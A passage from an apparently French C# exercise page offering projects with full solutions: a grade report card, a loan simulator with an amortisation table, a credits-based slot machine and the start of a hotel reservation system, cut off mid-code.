\"\ud83c\udfc6\";\n        }\n        else if (moyenne &gt;= 14)\n        {\n            mention = \"Bien\";\n            emoji = \"\ud83e\udd48\";\n        }\n        else if (moyenne &gt;= 12)\n        {\n            mention = \"Assez Bien\";\n            emoji = \"\ud83e\udd49\";\n        }\n        else if (moyenne &gt;= 10)\n        {\n            mention = \"Passable\";\n            emoji = \"\u2705\";\n        }\n        else\n        {\n            mention = \"Insuffisant\";\n            emoji = \"\u274c\";\n        }\n\n        // Affichage du bulletin\n        Console.Clear();\n        Console.WriteLine(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");\n        Console.WriteLine(\"\u2551              BULLETIN DE NOTES         \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine($\"\u2551 \u00c9tudiant : {nom,-27} \u2551\");\n        Console.WriteLine($\"\u2551 Mati\u00e8re  : {matiere,-27} \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine($\"\u2551 Nombre de notes    : {notes.Count,15} \u2551\");\n        Console.WriteLine($\"\u2551 Note minimale      : {noteMin,15:F1} \u2551\");\n        Console.WriteLine($\"\u2551 Note maximale      : {noteMax,15:F1} \u2551\");\n        Console.WriteLine($\"\u2551 Moyenne g\u00e9n\u00e9rale   : {moyenne,15:F2} \u2551\");\n        Console.WriteLine($\"\u2551 \u00c9cart-type         : {ecartType,15:F2} \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine($\"\u2551 Mention : {mention,-20} {emoji,7} \u2551\");\n        Console.WriteLine(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");\n\n        // D\u00e9tail des notes\n        Console.WriteLine(\"\\n\ud83d\udcdd D\u00e9tail des notes :\");\n        for (int i = 0; i &lt; notes.Count; i++)\n        {\n            string status = notes[i] &gt;= 10 ? \"\u2705\" : \"\u274c\";\n            Console.WriteLine($\"  Note {i + 1,2} : {notes[i],5:F1}/20 {status}\");\n        }\n\n        // Conseils\n        Console.WriteLine(\"\\n\ud83d\udca1 Conseils :\");\n        if (moyenne &gt;= 15)\n            Console.WriteLine(\"Excellent travail ! Continuez ainsi ! \ud83c\udf1f\");\n        else if (moyenne &gt;= 12)\n            Console.WriteLine(\"Bon niveau, quelques efforts pour viser l'excellence ! \ud83d\udcaa\");\n        else if (moyenne &gt;= 10)\n            Console.WriteLine(\"R\u00e9sultats corrects, mais des progr\u00e8s sont possibles ! \ud83d\udcc8\");\n        else\n            Console.WriteLine(\"Il faut redoubler d'efforts pour la prochaine fois ! \ud83c\udfaf\");\n    }\n}\n            \n        \n    \n\n\n\n\n\n    \n        \n            \ud83d\udd25 Interm\u00e9diaire\n            \ud83c\udfe6 Simulateur de Cr\u00e9dit\n            \n                <p>Cr\u00e9ez un simulateur de cr\u00e9dit bancaire complet.</p>\n\n                \n                    \ud83d\udccb Fonctionnalit\u00e9s \u00e0 impl\u00e9menter :\n                    <ul>\n                        <li>Calcul des mensualit\u00e9s (formule math\u00e9matique)</li>\n                        <li>Tableau d'amortissement d\u00e9taill\u00e9</li>\n                        <li>Calcul du co\u00fbt total du cr\u00e9dit</li>\n                        <li>Simulation de diff\u00e9rents sc\u00e9narios</li>\n                        <li>Graphique ASCII de l'\u00e9volution</li>\n                    </ul>\n                \n\n                \n                    \u23f1\ufe0f 45-60 min\n                    \ud83d\udcdd ~100 lignes\n                    \ud83c\udfaf Formules, boucles, formatage\n                \n            \n            \n                \ud83d\udca1 Voir la solution compl\u00e8te\n            \n        \n        \n            \n                <pre><code>using System;\n\nclass SimulateurCredit\n{\n    static void Main()\n    {\n        Console.WriteLine(\"\ud83c\udfe6 SIMULATEUR DE CR\u00c9DIT BANCAIRE \ud83c\udfe6\");\n        Console.WriteLine(\"===================================\\n\");\n\n        // Saisie des param\u00e8tres\n        Console.Write(\"Montant du cr\u00e9dit (\u20ac) : \");\n        double capital = double.Parse(Console.ReadLine());\n\n        Console.Write(\"Taux d'int\u00e9r\u00eat annuel (%) : \");\n        double tauxAnnuel = double.Parse(Console.ReadLine());\n\n        Console.Write(\"Dur\u00e9e en ann\u00e9es : \");\n        int dureeAnnees = int.Parse(Console.ReadLine());\n\n        // Calculs pr\u00e9liminaires\n        double tauxMensuel = tauxAnnuel / 100 / 12;\n        int nombreMois = dureeAnnees * 12;\n\n        // Calcul de la mensualit\u00e9 (formule math\u00e9matique)\n        double mensualite;\n        if (tauxMensuel == 0)\n        {\n            mensualite = capital / nombreMois;\n        }\n        else\n        {\n            mensualite = capital * tauxMensuel * Math.Pow(1 + tauxMensuel, nombreMois) \n                        / (Math.Pow(1 + tauxMensuel, nombreMois) - 1);\n        }\n\n        double coutTotal = mensualite * nombreMois;\n        double coutCredit = coutTotal - capital;\n\n        // Affichage du r\u00e9sum\u00e9\n        Console.Clear();\n        Console.WriteLine(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");\n        Console.WriteLine(\"\u2551           SIMULATION DE CR\u00c9DIT           \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine($\"\u2551 Capital emprunt\u00e9    : {capital,15:F2}\u20ac \u2551\");\n        Console.WriteLine($\"\u2551 Taux annuel         : {tauxAnnuel,15:F2}% \u2551\");\n        Console.WriteLine($\"\u2551 Dur\u00e9e               : {dureeAnnees,12} ans \u2551\");\n        Console.WriteLine($\"\u2551 Nombre de mensualit\u00e9s: {nombreMois,12} \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine($\"\u2551 Mensualit\u00e9          : {mensualite,15:F2}\u20ac \u2551\");\n        Console.WriteLine($\"\u2551 Co\u00fbt total          : {coutTotal,15:F2}\u20ac \u2551\");\n        Console.WriteLine($\"\u2551 Co\u00fbt du cr\u00e9dit      : {coutCredit,15:F2}\u20ac \u2551\");\n        Console.WriteLine(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");\n\n        Console.WriteLine(\"\\nAppuyez sur une touche pour voir le tableau d'amortissement...\");\n        Console.ReadKey();\n\n        // Tableau d'amortissement\n        Console.Clear();\n        Console.WriteLine(\"\ud83d\udcca TABLEAU D'AMORTISSEMENT\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        Console.WriteLine(\"Mois \u2502   Mensualit\u00e9 \u2502   Int\u00e9r\u00eats \u2502    Capital \u2502 Capital Restant\");\n        Console.WriteLine(\"\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\");\n\n        double capitalRestant = capital;\n        double totalInterets = 0;\n\n        for (int mois = 1; mois &lt;= nombreMois; mois++)\n        {\n            double interetsMois = capitalRestant * tauxMensuel;\n            double capitalRembourse = mensualite - interetsMois;\n            capitalRestant -= capitalRembourse;\n            totalInterets += interetsMois;\n\n            // Affichage seulement des 12 premiers mois et des 12 derniers\n            if (mois &lt;= 12 || mois &gt; nombreMois - 12)\n            {\n                Console.WriteLine($\"{mois,4} \u2502 {mensualite,12:F2}\u20ac \u2502 {interetsMois,10:F2}\u20ac \u2502 {capitalRembourse,10:F2}\u20ac \u2502 {Math.Max(0, capitalRestant),14:F2}\u20ac\");\n            }\n            else if (mois == 13)\n            {\n                Console.WriteLine(\"  ...\u2502      ...     \u2502     ...    \u2502     ...    \u2502       ...      \");\n            }\n        }\n\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        Console.WriteLine($\"TOTAL\u2502 {coutTotal,12:F2}\u20ac \u2502 {totalInterets,10:F2}\u20ac \u2502 {capital,10:F2}\u20ac \u2502 {0,14:F2}\u20ac\");\n\n        // Graphique ASCII de l'\u00e9volution\n        Console.WriteLine(\"\\n\ud83d\udcc8 \u00c9VOLUTION DU CAPITAL RESTANT\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n\n        capitalRestant = capital;\n        int largeurGraphique = 30;\n\n        for (int annee = 0; annee &lt;= dureeAnnees; annee++)\n        {\n            int barreLength = (int)((capitalRestant / capital) * largeurGraphique);\n            string barre = new string('\u2588', barreLength) + new string('\u2591', largeurGraphique - barreLength);\n\n            Console.WriteLine($\"An {annee,2} \u2502{barre}\u2502 {capitalRestant,10:F0}\u20ac\");\n\n            // Simulation d'une ann\u00e9e\n            for (int mois = 1; mois &lt;= 12 &amp;&amp; annee &lt; dureeAnnees; mois++)\n            {\n                double interetsMois = capitalRestant * tauxMensuel;\n                double capitalRembourse = mensualite - interetsMois;\n                capitalRestant = Math.Max(0, capitalRestant - capitalRembourse);\n            }\n        }\n\n        // Comparaison avec d'autres dur\u00e9es\n        Console.WriteLine(\"\\n\ud83d\udd0d COMPARAISON AVEC D'AUTRES DUR\u00c9ES\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        Console.WriteLine(\"Dur\u00e9e \u2502 Mensualit\u00e9 \u2502 Co\u00fbt total \u2502 Co\u00fbt cr\u00e9dit \u2502 Diff\u00e9rence\");\n        Console.WriteLine(\"\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\");\n\n        for (int duree = Math.Max(1, dureeAnnees - 2); duree &lt;= dureeAnnees + 2; duree++)\n        {\n            int mois = duree * 12;\n            double mens = capital * tauxMensuel * Math.Pow(1 + tauxMensuel, mois) \n                         / (Math.Pow(1 + tauxMensuel, mois) - 1);\n            double cout = mens * mois;\n            double coutCred = cout - capital;\n            double diff = coutCred - coutCredit;\n\n            string marqueur = duree == dureeAnnees ? \"\u25ba\" : \" \";\n            Console.WriteLine($\"{marqueur}{duree,4} \u2502 {mens,10:F2}\u20ac \u2502 {cout,10:F2}\u20ac \u2502 {coutCred,11:F2}\u20ac \u2502 {diff,+9:F2}\u20ac\");\n        }\n\n        Console.WriteLine(\"\\n\ud83d\udca1 Conseil : Plus la dur\u00e9e est courte, moins le cr\u00e9dit co\u00fbte cher !\");\n    }\n}</code></pre>\n            \n        \n    \n\n    \n        \n            \ud83d\udd25 Interm\u00e9diaire\n            \ud83c\udfb0 Machine \u00e0 Sous\n            \n                <p>D\u00e9veloppez une machine \u00e0 sous avec syst\u00e8me de cr\u00e9dits.</p>\n\n                \n                    \ud83d\udccb Fonctionnalit\u00e9s \u00e0 impl\u00e9menter :\n                    <ul>\n                        <li>Syst\u00e8me de cr\u00e9dits et de mises</li>\n                        <li>G\u00e9n\u00e9ration al\u00e9atoire des symboles</li>\n                        <li>Calcul des gains selon les combinaisons</li>\n                        <li>Statistiques de jeu</li>\n                        <li>Interface utilisateur anim\u00e9e</li>\n                    </ul>\n                \n\n                \n                    \u23f1\ufe0f 40-55 min\n                    \ud83d\udcdd ~120 lignes\n                    \ud83c\udfaf Random, logique, interface\n                \n            \n            \n                \ud83d\udca1 Voir la solution compl\u00e8te\n            \n        \n        \n            \n                <pre><code>using System;\nusing System.Threading;\n\nclass MachineASous\n{\n    static Random random = new Random();\n    static string[] symboles = { \"\ud83c\udf52\", \"\ud83c\udf4b\", \"\ud83c\udf4a\", \"\ud83c\udf47\", \"\u2b50\", \"\ud83d\udc8e\", \"7\ufe0f\u20e3\" };\n    static int[] multiplicateurs = { 2, 3, 4, 5, 10, 20, 50 };\n\n    static void Main()\n    {\n        int credits = 100;\n        int totalMises = 0;\n        int totalGains = 0;\n        int nombreParties = 0;\n\n        Console.WriteLine(\"\ud83c\udfb0 MACHINE \u00c0 SOUS DELUXE \ud83c\udfb0\");\n        Console.WriteLine(\"============================\\n\");\n        Console.WriteLine(\"Bienvenue ! Vous commencez avec 100 cr\u00e9dits.\");\n        Console.WriteLine(\"Mise minimum : 1 cr\u00e9dit, maximum : 10 cr\u00e9dits\\n\");\n\n        AfficherTableGains();\n\n        while (credits &gt; 0)\n        {\n            Console.WriteLine($\"\\n\ud83d\udcb0 Cr\u00e9dits disponibles : {credits}\");\n            Console.Write(\"Votre mise (0 pour quitter) : \");\n\n            if (!int.TryParse(Console.ReadLine(), out int mise))\n            {\n                Console.WriteLine(\"\u274c Mise invalide !\");\n                continue;\n            }\n\n            if (mise == 0)\n            {\n                Console.WriteLine(\"Merci d'avoir jou\u00e9 ! \ud83d\udc4b\");\n                break;\n            }\n\n            if (mise &lt; 1 || mise &gt; 10)\n            {\n                Console.WriteLine(\"\u274c Mise doit \u00eatre entre 1 et 10 cr\u00e9dits !\");\n                continue;\n            }\n\n            if (mise &gt; credits)\n            {\n                Console.WriteLine(\"\u274c Cr\u00e9dits insuffisants !\");\n                continue;\n            }\n\n            // D\u00e9duction de la mise\n            credits -= mise;\n            totalMises += mise;\n            nombreParties++;\n\n            // Animation du tirage\n            Console.WriteLine(\"\\n\ud83c\udfb0 Tirage en cours...\");\n            AnimationTirage();\n\n            // G\u00e9n\u00e9ration des r\u00e9sultats\n            int[] resultats = new int[3];\n            for (int i = 0; i &lt; 3; i++)\n            {\n                resultats[i] = random.Next(symboles.Length);\n            }\n\n            // Affichage des r\u00e9sultats\n            Console.WriteLine(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");\n            Console.WriteLine($\"\u2551  {symboles[resultats[0]]}  \u2502  {symboles[resultats[1]]}  \u2502  {symboles[resultats[2]]}  \u2551\");\n            Console.WriteLine(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");\n\n            // Calcul des gains\n            int gain = CalculerGain(resultats, mise);\n\n            if (gain &gt; 0)\n            {\n                credits += gain;\n                totalGains += gain;\n                Console.WriteLine($\"\ud83c\udf89 GAGN\u00c9 ! +{gain} cr\u00e9dits !\");\n\n                if (gain &gt;= mise * 10)\n                    Console.WriteLine(\"\ud83d\udc8e JACKPOT ! Incroyable ! \ud83d\udc8e\");\n                else if (gain &gt;= mise * 5)\n                    Console.WriteLine(\"\u2b50 SUPER GAIN ! \u2b50\");\n            }\n            else\n            {\n                Console.WriteLine(\"\ud83d\ude1e Perdu... Tentez votre chance !\");\n            }\n\n            // Affichage des statistiques\n            if (nombreParties % 5 == 0)\n            {\n                AfficherStatistiques(nombreParties, totalMises, totalGains, credits + totalMises - 100);\n            }\n        }\n\n        // Statistiques finales\n        Console.WriteLine(\"\\n\ud83c\udfae PARTIE TERMIN\u00c9E \ud83c\udfae\");\n        AfficherStatistiques(nombreParties, totalMises, totalGains, credits + totalMises - 100);\n\n        if (credits &gt; 100)\n            Console.WriteLine(\"\ud83c\udfc6 F\u00e9licitations ! Vous repartez avec des gains ! \ud83c\udfc6\");\n        else if (credits &gt; 50)\n            Console.WriteLine(\"\ud83d\ude0a Pas mal ! Vous avez bien r\u00e9sist\u00e9 ! \ud83d\ude0a\");\n        else\n            Console.WriteLine(\"\ud83d\ude05 La chance n'\u00e9tait pas de votre c\u00f4t\u00e9 aujourd'hui ! \ud83d\ude05\");\n    }\n\n    static void AnimationTirage()\n    {\n        for (int i = 0; i &lt; 10; i++)\n        {\n            Console.Write($\"\\r\ud83c\udfb0 {symboles[random.Next(symboles.Length)]} {symboles[random.Next(symboles.Length)]} {symboles[random.Next(symboles.Length)]} \ud83c\udfb0\");\n            Thread.Sleep(100);\n        }\n        Console.WriteLine();\n    }\n\n    static int CalculerGain(int[] resultats, int mise)\n    {\n        // Trois symboles identiques\n        if (resultats[0] == resultats[1] &amp;&amp; resultats[1] == resultats[2])\n        {\n            return mise * multiplicateurs[resultats[0]];\n        }\n\n        // Deux symboles identiques\n        if (resultats[0] == resultats[1] || resultats[1] == resultats[2] || resultats[0] == resultats[2])\n        {\n            int symboleCommun = resultats[0] == resultats[1] ? resultats[0] : \n                               resultats[1] == resultats[2] ? resultats[1] : resultats[0];\n\n            // Gain r\u00e9duit pour deux symboles\n            if (symboleCommun &gt;= 4) // Symboles rares\n                return mise * 2;\n            else if (symboleCommun &gt;= 2) // Symboles moyens\n                return mise;\n        }\n\n        return 0; // Aucun gain\n    }\n\n    static void AfficherTableGains()\n    {\n        Console.WriteLine(\"\ud83d\udccb TABLE DES GAINS (pour 1 cr\u00e9dit mis\u00e9)\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        for (int i = 0; i &lt; symboles.Length; i++)\n        {\n            Console.WriteLine($\"{symboles[i]} {symboles[i]} {symboles[i]} = x{multiplicateurs[i]}\");\n        }\n        Console.WriteLine(\"Deux symboles identiques = x1 ou x2\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n    }\n\n    static void AfficherStatistiques(int parties, int mises, int gains, int benefice)\n    {\n        Console.WriteLine(\"\\n\ud83d\udcca STATISTIQUES\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        Console.WriteLine($\"Parties jou\u00e9es    : {parties}\");\n        Console.WriteLine($\"Total mis\u00e9        : {mises} cr\u00e9dits\");\n        Console.WriteLine($\"Total gagn\u00e9       : {gains} cr\u00e9dits\");\n        Console.WriteLine($\"B\u00e9n\u00e9fice/Perte    : {benefice:+0;-0;0} cr\u00e9dits\");\n\n        if (mises &gt; 0)\n        {\n            double tauxRetour = (double)gains / mises * 100;\n            Console.WriteLine($\"Taux de retour    : {tauxRetour:F1}%\");\n        }\n\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n    }\n}</code></pre>\n            \n        \n    \n\n\n\n\n\n    \n        \n            \ud83d\ude80 Avanc\u00e9\n            \ud83c\udfe8 Syst\u00e8me de R\u00e9servation H\u00f4tel\n            \n                <p>Cr\u00e9ez un syst\u00e8me complet de gestion d'h\u00f4tel.</p>\n\n                \n                    \ud83d\udccb Fonctionnalit\u00e9s \u00e0 impl\u00e9menter :\n                    <ul>\n                        <li>Gestion des chambres (types, prix, disponibilit\u00e9)</li>\n                        <li>Syst\u00e8me de r\u00e9servation avec dates</li>\n                        <li>Calcul automatique des tarifs</li>\n                        <li>Gestion des clients et historique</li>\n                        <li>Rapports et statistiques</li>\n                    </ul>\n                \n\n                \n                    \u23f1\ufe0f 60-90 min\n                    \ud83d\udcdd ~200 lignes\n                    \ud83c\udfaf Structures, dates, gestion\n                \n            \n            \n                \ud83d\udca1 Voir la solution compl\u00e8te\n            \n        \n        \n            \n                <pre><code>using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n// Structures de donn\u00e9es\nstruct Chambre\n{\n    public int Numero;\n    public string Type;\n    public double PrixParNuit;\n    public bool EstDisponible;\n    public DateTime DateLiberation;\n}\n\nstruct Reservation\n{\n    public int Id;\n    public string NomClient;\n    public int NumeroChambre;\n    public DateTime DateArrivee;\n    public DateTime DateDepart;\n    public double MontantTotal;\n    public bool EstActive;\n}\n\nclass SystemeHotel\n{\n    static List chambres = new List();\n    static List reservations = new List();\n    static int prochainIdReservation = 1;\n\n    static void Main()\n    {\n        InitialiserChambres();\n\n        Console.WriteLine(\"\ud83c\udfe8 SYST\u00c8ME DE R\u00c9SERVATION H\u00d4TEL \ud83c\udfe8\");\n        Console.WriteLine(\"===================================\\n\");\n\n        bool continuer = true;\n        while (continuer)\n        {\n            AfficherMenu();\n            string choix = Console.ReadLine();\n\n            switch (choix)\n            {\n                case \"1\":\n                    AfficherChambres();\n                    break;\n                case \"2\":\n                    FaireReservation();\n                    break;\n                case \"3\":\n                    AfficherReservations();\n                    break;\n                case \"4\":\n                    LibererChambre();\n                    break;\n                case \"5\":\n                    AfficherStatistiques();\n                    break;\n                case \"6\":\n                    continuer = false;\n                    Console.WriteLine(\"Au revoir ! \ud83d\udc4b\");\n                    break;\n                default:\n                    Console.WriteLine(\"\u274c Choix invalide !\");\n                    break;\n            }\n\n            if (continuer)\n            {\n                Console.WriteLine(\"\\nAppuyez sur une touche pour continuer...\");\n                Console.ReadKey();\n                Console.Clear();\n            }\n        }\n    }\n\n    static void InitialiserChambres()\n    {\n        // Chambres simples\n        for (int i = 101; i &lt;= 110; i++)\n        {\n            chambres.Add(new Chambre \n            { \n                Numero = i, \n                Type = \"Simple\", \n                PrixParNuit = 80, \n                EstDisponible = true,\n                DateLiberation = DateTime.Today\n            });\n        }\n\n        // Chambres doubles\n        for (int i = 201; i &lt;= 208; i++)\n        {\n            chambres.Add(new Chambre \n            { \n                Numero = i, \n                Type = \"Double\", \n                PrixParNuit = 120, \n                EstDisponible = true,\n                DateLiberation = DateTime.Today\n            });\n        }\n\n        // Suites\n        for (int i = 301; i &lt;= 304; i++)\n        {\n            chambres.Add(new Chambre \n            { \n                Numero = i, \n                Type = \"Suite\", \n                PrixParNuit = 200, \n                EstDisponible = true,\n                DateLiberation = DateTime.Today\n            });\n        }\n    }\n\n    static void AfficherMenu()\n    {\n        Console.WriteLine(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");\n        Console.WriteLine(\"\u2551           MENU PRINCIPAL         \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine(\"\u2551 1. Voir les chambres             \u2551\");\n        Console.WriteLine(\"\u2551 2. Faire une r\u00e9servation         \u2551\");\n        Console.WriteLine(\"\u2551 3. Voir les r\u00e9servations         \u2551\");\n        Console.WriteLine(\"\u2551 4. Lib\u00e9rer une chambre           \u2551\");\n        Console.WriteLine(\"\u2551 5. Statistiques                  \u2551\");\n        Console.WriteLine(\"\u2551 6. Quitter                       \u2551\");\n        Console.WriteLine(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");\n        Console.Write(\"\\nVotre choix : \");\n    }\n\n    static void AfficherChambres()\n    {\n        Console.Clear();\n        Console.WriteLine(\"\ud83c\udfe8 \u00c9TAT DES CHAMBRES\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        Console.WriteLine(\"Num\u00e9ro \u2502   Type   \u2502 Prix/nuit \u2502  Statut  \u2502 Libre le\");\n        Console.WriteLine(\"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\");\n\n        var chambresParType = chambres.GroupBy(c =&gt; c.Type).OrderBy(g =&gt; g.Key);\n\n        foreach (var groupe in chambresParType)\n        {\n            foreach (var chambre in groupe.OrderBy(c =&gt; c.Numero))\n            {\n                string statut = 